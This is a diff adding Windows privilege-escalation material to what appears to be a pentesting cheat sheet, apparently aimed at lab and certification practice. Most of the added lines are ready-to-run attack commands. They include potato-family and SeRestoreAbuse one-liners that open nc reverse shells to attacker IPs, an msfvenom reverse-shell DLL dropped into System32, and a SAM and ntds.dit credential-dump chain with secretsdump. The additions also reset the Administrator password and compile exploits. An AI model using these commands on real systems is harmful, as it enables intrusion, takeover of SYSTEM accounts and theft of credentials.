@@ -179,6 +179,7 @@ I try as much as possible to link to the various sources or inspiration for thes
     - [Kernel Exploits](#kernel-exploits-1)
     - [Driver Exploits](#driver-exploits)
     - [Service Exploits](#service-exploits-1)
+    - [CVEs](#cves)
     - [User Account Control (UAC)](#user-account-control-uac)
     - [Insecure File Permissions](#insecure-file-permissions)
     - [Registry](#registry)
@@ -4534,7 +4535,7 @@ See [Information gathering | Windows](#windows). Always obtain:
 
 #### <ins>Privileges</ins>
 - Paper: [Abusing Token Privileges For EoP](https://github.com/hatRiot/token-priv)
-- List your privileges: `whoami /priv`
+- List your privileges: `whoami /priv`, see also https://github.com/gtworek/Priv2Admin
   - `SeImpersonatePrivilege`
   - `SeAssignPrimaryPrivilege`
   - `SeBackupPrivilege`
@@ -4544,18 +4545,126 @@ See [Information gathering | Windows](#windows). Always obtain:
   - `SeCreateTokenPrivilege`
   - `SeLoadDriverPrivilege`
   - `SeDebugPrivilege`
+- More privs: [FindSuspiciousPermissions.ps1](https://github.com/fashionproof/FindSuspiciousPermissions/blob/main/FindSuspiciousPermissions.ps1)
+
+**AlwaysInstallElevated**
+- You can run any `.msi`
+
+**SeLoadDriverPrivilege**
+- https://0xdf.gitlab.io/2020/10/31/htb-fuse.html#strategy
+- https://www.tarlogic.com/blog/seloaddriverprivilege-privilege-escalation/
+- See also [HackTheBox Fuse](https://app.hackthebox.com/machines/Fuse)
+
+**SetRestorePrivilege**
+- `./SeRestoreAbuse.exe "C:\temp\nc.exe 192.168.45.238 445 -e powershell.exe"`
+
+**SeManageVolumePrivilege**
+1. `.\SeManageVolumeAbuse.exe`
+2. `msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.45.215 LPORT=445 -f dll -o tzres.dll`
+3. `cp tzres.dll C:\Windows\System32\wbem\`
+
+**SeImpersonatePrivilege**
+
+PrintSpoofer
+- `.\PrintSpoofer.exe -i -c powershell.exe`
+- `.\PrintSpoofer.exe -i -c "\\192.168.45.156\Share\nc.exe 192.168.45.156 443 -e cmd.exe"`
+
+JuicyPotato
+- `.\JuicyPotato.x86.exe -t * -p "\\10.10.14.10\Share\nc.exe 10.10.14.10 88 -e cmd.exe" -l 443`
+- `.\JuicyPotato.exe -t * -p C:\User\mario\root.bat -l 9001 -c {A9B5F443-FE02-4C19-859D-E9B5C5A1B6C6}`
+  - In `root.bat`, use the following once at time
+    ```
+    whoami /all > C:\Users\Public\proof.txt   <# verify that you are authority #>
+    net user Administrator abc123!            <# modify Administrator password to then login with psexec #>
+    ```
+  - See here for CLSID for the value of the flag `-c`: https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_10_Enterprise
+
+Other
+- `.\GodPotato-NET4.exe -cmd "\\192.168.45.156\Share\nc.exe 192.168.45.156 443 -e cmd.exe"`
+  - Affected version: Windows Server 2012 - Windows Server 2022 Windows8 - Windows 11
+- `.\RogueWinRM.exe -p "\\10.10.14.26\Share\nc.exe" -a "-e cmd.exe 10.10.14.26 88"`
+  
+  
+**SeBackupPrivilege**
+1. https://github.com/giuliano108/SeBackupPrivilege
+   ```
+   import-module .\SeBackupPrivilegeUtils.dll
+   import-module .\SeBackupPrivilegeCmdLets.dll
+   ```
+2. `iwr -uri http://10.18.110.121/diskshadow.txt -o diskshadow.txt`
+   - If you have modified `diskshadow.txt` and it doesn't work, run: `unix2dos diskshadow.txt`
+3. `diskshadow /s diskshadow.txt`
+4. `cd E:`
+5. `robocopy /b E:\Windows\ntds . ntds.dit`
+6. ```
+   reg save hklm\system c:\tmp\system
+   reg save hklm\sam c:\tmp\sam
+   ```
+7. ```
+   download ntds.dit
+   download system.bak
+   download sam
+   ```
+8. `samdump2 system sam`
+9. `impacket-secretsdump -ntds ntds.dit -system system LOCAL`
+
+
+**SeRestorePrivelege**
+1. list manual start service:
+   ```
+   cmd.exe /c sc queryex state=all type=service
+   Get-Service | findstr -i "manual"
+   gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
+   gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "manual"} | select PathName,DisplayName,Name
+   ```
+2. Check seclogon, known to have manual start permissions and that can be started by all users
+   ```
+   reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\seclogon
+   cmd.exe /c sc sdshow seclogon
+   - RP = Start Service / AU = All Users
+   - winhelponline.com/blog/view-edit-service-permissions-windows/
+   ```
+3. SeRestoreAbuse exploit
+   ```
+   .\SeRestoreAbuse.exe "C:\temp\nc.exe 192.168.45.238 445 -e powershell.exe"
+   ```
+- See also: https://0xdf.gitlab.io/2020/09/19/htb-multimaster.html#shell-as-system
 
 #### <ins>Strategy</ins>
 
-1. Check your user (`whoami`) and groups (`net user <username>`)
-2. Run winPEAS with fast, searchfast, and cmd options
-   - Run Seatbelt & other scripts
-   - Check also: [PayloadsAllTheThings/Methodology and Resources/Windows - Privilege Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
-3. Have a quick look around for files in your user’s desktop and other common locations
-   - Read through interesting files
-4. Try things that don’t have many steps first (e.g. registry exploits, services, etc.)
-5. Look at admin processes, enumerate their versions and search for exploits
-6. Check for internal ports that you might be able to forward to your attacking machine
+- [ ] Run the following commands
+  - `whoami /priv`
+  - `whoami /groups`
+  - `whoami /all`
+  - `netstat -ano`
+  - especially seek out for services like `mssql`
+- [ ] See `systeminfo` for CVE + `searchsploit`, `wes.py` and `windows-exploit-suggester.py`
+  - see the dedicated sections for more inspiration + known exploits
+- [ ] See if something is out of place in `C:\` and `C:\Users\username\`
+- [ ] See the programs installed in their directories
+- [ ] Run the scripts
+  - `winPEAS`, options: `fast`, `searchfast`, and `cmd`
+  - `.\seatbelt.exe NonstandardProcesses`
+  - `PowerUp.ps1` -> `Invoke-AllChecks`
+  - `windows-privesc-check.exe --dump -G`
+  - `powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"`
+  - `powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"`
+  - `.\jaws-enum.ps1`
+  - more
+    - https://rahmatnurfauzi.medium.com/windows-privilege-escalation-scripts-techniques-30fa37bd194
+    - https://www.hackingarticles.in/post-exploitation-on-saved-password-with-lazagne/
+    - https://github.com/SnaffCon/Snaffler
+- [ ] With meterpreter, you can run the module `local_exploit_suggester`
+- [ ] In `C:`, run the command `dir -force` to see the hidden directories
+  - one interesting directory is `PSTranscripts/Transcripts`
+  - keep using `dir -force` inside of the hidden directories
+- [ ] Check LOLBAS: https://lolbas-project.github.io/
+- [ ] If out of ideas / luck:
+  - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
+  - https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
+  - https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
+  - http://pwnwiki.io/#!privesc/windows/index.md
+  - https://fuzzysecurity.com/tutorials/16.html
 
 #### <ins>Add new admin user</ins>
 
@@ -4571,6 +4680,8 @@ int main () {
 - 32-bit Windows executable: `i686-w64-mingw32-gcc adduser.c -o adduser.exe`
 - 64-bit Windows executable: `x86_64-w64-mingw32-gcc -o adduser.exe adduser.c`
 - Note: [32-bit and 64-bit Windows: Frequently asked questions](https://support.microsoft.com/en-us/windows/32-bit-and-64-bit-windows-frequently-asked-questions-c6ca9541-8dce-4d48-0415-94a3faa2e13d)
+- verify that the user has been added with `net user`
+- run `echo password | runas /savecred /user:rootevil cmd`
 
 #### <ins>Generate a reverse shell</ins>
 
@@ -4660,6 +4771,41 @@ net start/stop <name>                            Start/Stop a service
 
 **DLL Hijacking**
 - See: [DLL Hijacking](#dll-hijacking)
+
+#### <ins>CVEs</ins>
+
+- Check if `CVE-2018-8120` works
+- See programs in `Program Files` and `(x86)` and search for CVEs
+- `systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"`
+- Note: Hotfix means patches, if you see N/A means that nothing has been patches
+- See if you can connect as RDP to more easily find other vulnerable installed applications
+
+**Run**
+- `python wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only`
+- `python windows-exploit-suggester.py --database 2023-09-12-mssb.xls --systeminfo systeminfo.txt`
+- if you can't use `systeminfo`, try `wmic qfe list full` and save it as `systeminfo.txt`
+- `searchsploit Windows Server 2012 Privilege`
+
+**Windows Server 2008**
+- https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051
+
+**CVE-2018-8440**
+- If you see Hotfix N/A + write priv in `C:\Windows\tasks`
+  - run to see if you have write priv: `icacls C:\Windows\Tasks`
+- Try to run `/home/kali/Documents/windows-attack/CVE/CVE-2018-8440/Release/poc.exe`
+
+**See the version of an exe**
+- `Get-ItemProperty -Path "C:\Program Files\Microsoft Azure AD Sync\Bin\miiserver.exe" | Format-list -Property * -Force`
+
+**Compile exploits**
+- `cl 42020.cpp /EHsc /DUNICODE /D_UNICODE`
+- `gcc -o output.c input.c`
+- `gcc -m32 -o output.c input.c`
+- `g++ your_program.cpp -o your_program`
+- `i686-w64-gcc adduser.c -o adduser.exe`
+- `x86_64-w64-mingw32-gcc adduser.c -o adduser.exe`
+- `i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32`
+- `mcs Wrapper.cs`
 
 #### <ins>User Account Control (UAC)</ins>
 
